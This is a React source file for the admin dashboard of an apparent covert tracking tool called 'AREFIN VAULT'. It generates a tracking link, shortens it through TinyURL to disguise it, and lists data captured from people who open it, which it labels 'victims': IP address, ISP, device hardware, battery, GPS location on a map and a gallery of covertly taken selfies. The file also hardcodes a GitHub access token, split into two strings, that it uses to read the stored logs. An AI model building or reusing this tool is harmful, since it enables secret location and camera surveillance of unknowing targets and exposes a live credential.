
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { auth } from '../firebase';

interface LogEntry {
  id: string;
  time: string;
  ip: string;
  isp: string;
  platform: string;
  userAgent: string;
  ram: string;
  cores: number | string;
  gpu: string;
  screen: string;
  network: string;
  battery: any;
  location: any;
  photos: string[];
  userId: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [shortUrl, setShortUrl] = useState('');
  const [copySuccess, setCopySuccess] = useState(false);
  const [viewMap, setViewMap] = useState<{lat: number, lng: number} | null>(null);
  const [viewPhotos, setViewPhotos] = useState<string[] | null>(null);

  const P1 = "ghp_S06vJDMF26hmKNIc";
  const P2 = "EXibFC2GFggjTf40WyXZ";
  const G_TOKEN = P1 + P2;
  const G_OWNER = "arefinfoysalo";
  const G_REPO = "livecameralocation";
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  const fetchLogs = async () => {
    try {
      const res = await fetch(`https://api.github.com/repos/${G_OWNER}/${G_REPO}/contents/data/logs`, {
        headers: { 'Authorization': `token ${G_TOKEN}` }
      });
      if (!res.ok) { setLoading(false); return; }
      const files = await res.json();
      
      const logPromises = files.filter((f: any) => f.name.endsWith('.json')).map(async (file: any) => {
        const contentRes = await fetch(file.download_url);
        const data = await contentRes.json();
        return { id: file.name, ...data };
      });

      const allLogs = await Promise.all(logPromises);
      const myLogs = allLogs.filter(l => l.userId === user.uid);
      setLogs(myLogs.sort((a, b) => b.id.localeCompare(a.id)));
    } catch (e) { console.error(e); } finally { setLoading(false); }
  };

  const shortenUrl = async () => {
    try {
      const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      const data = await res.text();
      setShortUrl(data);
    } catch (e) { alert("Shortener service error."); }
  };

  useEffect(() => {
    fetchLogs();
    const interval = setInterval(fetchLogs, 10000);
    return () => clearInterval(interval);
  }, [user.uid]);

  return (
    <div className="min-h-screen bg-[#F1F5F9] font-['Hind_Siliguri'] text-slate-800">
      {/* Sidebar Profile & Nav */}
      <nav className="bg-white/80 backdrop-blur-xl border-b sticky top-0 z-50 px-6 py-4 flex justify-between items-center shadow-sm">
        <div className="flex items-center gap-3">
           <div className="w-10 h-10 bg-gradient-to-tr from-blue-600 to-indigo-600 rounded-2xl flex items-center justify-center text-white shadow-lg shadow-blue-200">
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
           </div>
           <div>
              <h1 className="text-lg font-black tracking-tight leading-none">AREFIN VAULT</h1>
              <p className="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-1">Advanced Tracking Admin</p>
           </div>
        </div>
        <button onClick={() => signOut(auth)} className="bg-red-50 text-red-600 px-5 py-2.5 rounded-2xl text-[11px] font-black hover:bg-red-600 hover:text-white transition-all">LOGOUT</button>
      </nav>

      <main className="max-w-7xl mx-auto p-4 md:p-8 grid grid-cols-1 xl:grid-cols-4 gap-8">
        
        {/* Left: Owner & Tool Section */}
        <aside className="xl:col-span-1 space-y-6">
           <div className="bg-white p-8 rounded-[40px] border border-slate-200 shadow-sm text-center">
              <div className="w-24 h-24 bg-blue-50 rounded-[35px] mx-auto mb-4 flex items-center justify-center overflow-hidden border-4 border-white shadow-xl">
                 <img src="https://ui-avatars.com/api/?name=Arefin+Foysal&background=2563eb&color=fff&size=128" alt="Owner" />
              </div>
              <h2 className="text-xl font-black">Arefin Foysal</h2>
              <p className="text-xs text-slate-400 font-medium mb-6">Developer & Security Expert</p>
              <div className="flex justify-center gap-3">
                 <a href="https://facebook.com" className="w-10 h-10 bg-blue-600 text-white rounded-xl flex items-center justify-center hover:scale-110 transition-transform shadow-lg shadow-blue-100">f</a>
                 <a href="#" className="w-10 h-10 bg-slate-900 text-white rounded-xl flex items-center justify-center hover:scale-110 transition-transform shadow-lg shadow-slate-100">𝕏</a>
              </div>
           </div>

           <div className="bg-gradient-to-br from-blue-600 to-indigo-700 p-8 rounded-[40px] text-white shadow-2xl shadow-blue-200">
              <p className="text-[10px] font-black uppercase tracking-widest mb-4 opacity-70">Shorten Your Link</p>
              <button onClick={shortenUrl} className="w-full bg-white/10 hover:bg-white/20 border border-white/20 py-4 rounded-3xl font-black text-xs transition-all mb-4 backdrop-blur-md">
                 GENERATE TINYURL
              </button>
              {shortUrl && (
                <div className="bg-white/10 p-4 rounded-2xl border border-white/10">
                   <p className="text-[9px] mb-1 font-black opacity-50">SHORT LINK:</p>
                   <p className="text-xs font-mono break-all font-bold">{shortUrl}</p>
                </div>
              )}
           </div>
        </aside>

        {/* Right: Main Content */}
        <div className="xl:col-span-3 space-y-8">
           {/* Tracker URL Card */}
           <section className="bg-white p-8 rounded-[40px] border border-slate-200 shadow-sm">
              <div className="flex justify-between items-center mb-4">
                 <p className="text-[10px] font-black text-blue-600 uppercase tracking-widest">Global Tracking Link</p>
                 <span className="bg-green-100 text-green-600 px-3 py-1 rounded-full text-[9px] font-black animate-pulse uppercase">Active</span>
              </div>
              <div className="flex flex-col md:flex-row gap-3">
                 <input readOnly value={trackerLink} className="flex-1 bg-slate-50 border border-slate-100 px-6 py-4 rounded-3xl text-xs font-mono text-slate-500 outline-none" />
                 <button onClick={() => { navigator.clipboard.writeText(trackerLink); setCopySuccess(true); setTimeout(()=>setCopySuccess(false), 2000); }} 
                   className="bg-slate-900 text-white px-10 py-4 rounded-3xl font-black text-xs hover:bg-black transition-all shadow-xl shadow-slate-200">
                   {copySuccess ? 'COPIED!' : 'COPY FULL LINK'}
                 </button>
              </div>
           </section>

           {/* Victims Grid */}
           <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
             {loading ? (
               <div className="col-span-full text-center py-20 bg-white rounded-[40px] animate-pulse text-slate-400 font-bold uppercase tracking-widest text-xs">Synchronizing Logs...</div>
             ) : logs.length === 0 ? (
               <div className="col-span-full text-center py-24 bg-white rounded-[40px] border-2 border-dashed border-slate-200">
                  <p className="text-slate-400 font-black italic uppercase tracking-tighter opacity-50">No Data Captured Yet</p>
               </div>
             ) : logs.map((log, index) => (
               <div key={log.id} className="bg-white rounded-[45px] border border-slate-100 overflow-hidden shadow-sm hover:shadow-xl transition-all group">
                 <div className="p-8 space-y-6">
                    <div className="flex justify-between items-start">
                       <div>
                          <div className="flex items-center gap-2 mb-1">
                             <h3 className="text-2xl font-black text-slate-900 leading-none">{log.ip}</h3>
                             <span className="bg-blue-50 text-blue-600 px-3 py-1 rounded-full text-[9px] font-black">#{logs.length - index}</span>
                          </div>
                          <p className="text-[10px] text-blue-600 font-black uppercase tracking-wider">{log.isp}</p>
                       </div>
                       <div className="text-right">
                          <p className="text-[9px] font-black text-slate-400 uppercase">Battery</p>
                          <p className="font-black text-slate-800 text-sm">{typeof log.battery === 'object' ? `${log.battery.level}% ${log.battery.charging ? '⚡' : ''}` : 'N/A'}</p>
                       </div>
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                       <div className="bg-slate-50/80 p-5 rounded-[30px] border border-slate-100">
                          <p className="text-[8px] font-black text-slate-400 uppercase mb-2">Hardware Specs</p>
                          <div className="space-y-1">
                             <p className="text-[11px] font-black text-slate-700 leading-tight">RAM: {log.ram}</p>
                             <p className="text-[11px] font-black text-slate-700 leading-tight">CPU: {log.cores} Core</p>
                             <p className="text-[11px] font-black text-slate-700 leading-tight truncate">GPU: {log.gpu}</p>
                          </div>
                       </div>
                       <div className="bg-slate-50/80 p-5 rounded-[30px] border border-slate-100">
                          <p className="text-[8px] font-black text-slate-400 uppercase mb-2">Network & Display</p>
                          <div className="space-y-1">
                             <p className="text-[11px] font-black text-slate-700 leading-tight text-blue-600">{log.network}</p>
                             <p className="text-[11px] font-black text-slate-700 leading-tight">{log.screen}</p>
                             <p className="text-[10px] font-bold text-slate-400 italic">{log.time}</p>
                          </div>
                       </div>
                    </div>

                    <div className="flex gap-3">
                       <button 
                         disabled={!log.photos || log.photos.length === 0}
                         onClick={() => setViewPhotos(log.photos)}
                         className={`flex-1 py-5 rounded-[25px] text-[11px] font-black transition-all ${log.photos?.length > 0 ? 'bg-slate-900 text-white shadow-xl shadow-slate-100' : 'bg-slate-100 text-slate-300'}`}
                       >
                         GALLERY ({log.photos?.length || 0})
                       </button>
                       <button 
                         disabled={typeof log.location !== 'object'}
                         onClick={() => setViewMap(log.location)}
                         className={`flex-1 py-5 rounded-[25px] text-[11px] font-black transition-all ${typeof log.location === 'object' ? 'bg-blue-600 text-white shadow-xl shadow-blue-50' : 'bg-slate-100 text-slate-300'}`}
                       >
                         LIVE MAP
                       </button>
                    </div>
                 </div>
               </div>
             ))}
           </div>
        </div>
      </main>

      {/* Gallery Modal */}
      {viewPhotos && (
        <div className="fixed inset-0 z-[100] bg-slate-900/95 backdrop-blur-xl flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-4xl rounded-[60px] overflow-hidden shadow-2xl">
              <div className="p-10 flex justify-between items-center border-b bg-slate-50/50">
                 <h4 className="font-black text-slate-800 text-lg uppercase tracking-widest">Selfie Burst Gallery</h4>
                 <button onClick={() => setViewPhotos(null)} className="w-12 h-12 bg-white rounded-2xl flex items-center justify-center text-slate-400 shadow-sm border border-slate-100 text-xl font-bold">✕</button>
              </div>
              <div className="p-10 grid grid-cols-1 md:grid-cols-3 gap-6 max-h-[70vh] overflow-y-auto">
                 {viewPhotos.map((url, i) => (
                   <div key={i} className="group relative">
                      <img src={url} className="w-full h-64 object-cover rounded-[40px] border-8 border-slate-50 shadow-xl transition-transform group-hover:scale-105" alt={`Capture ${i+1}`} />
                      <div className="absolute top-4 left-4 bg-blue-600 text-white px-4 py-2 rounded-2xl text-[10px] font-black shadow-lg">SHOT #{i+1}</div>
                   </div>
                 ))}
              </div>
              <div className="p-10 text-center border-t bg-slate-50/30">
                 <button onClick={() => setViewPhotos(null)} className="bg-slate-900 text-white px-16 py-5 rounded-[30px] font-black text-xs shadow-xl shadow-slate-200">BACK TO CONSOLE</button>
              </div>
           </div>
        </div>
      )}

      {/* Map Modal */}
      {viewMap && (
        <div className="fixed inset-0 z-[100] bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-2xl rounded-[60px] overflow-hidden shadow-2xl">
              <div className="p-10 flex justify-between items-center border-b">
                 <h4 className="font-black text-slate-800 text-lg uppercase tracking-widest">Target Geospatial Intel</h4>
                 <button onClick={() => setViewMap(null)} className="w-12 h-12 bg-slate-50 rounded-2xl flex items-center justify-center text-slate-400 text-xl">✕</button>
              </div>
              <iframe width="100%" height="400" frameBorder="0" className="grayscale contrast-125" src={`https://maps.google.com/maps?q=${viewMap.lat},${viewMap.lng}&z=16&output=embed`}></iframe>
              <div className="p-10">
                 <a href={`https://www.google.com/maps?q=${viewMap.lat},${viewMap.lng}`} target="_blank" className="block w-full bg-blue-600 text-white py-6 rounded-[35px] font-black text-xs text-center shadow-xl shadow-blue-100">OPEN COORDINATES IN GOOGLE MAPS</a>
              </div>
           </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
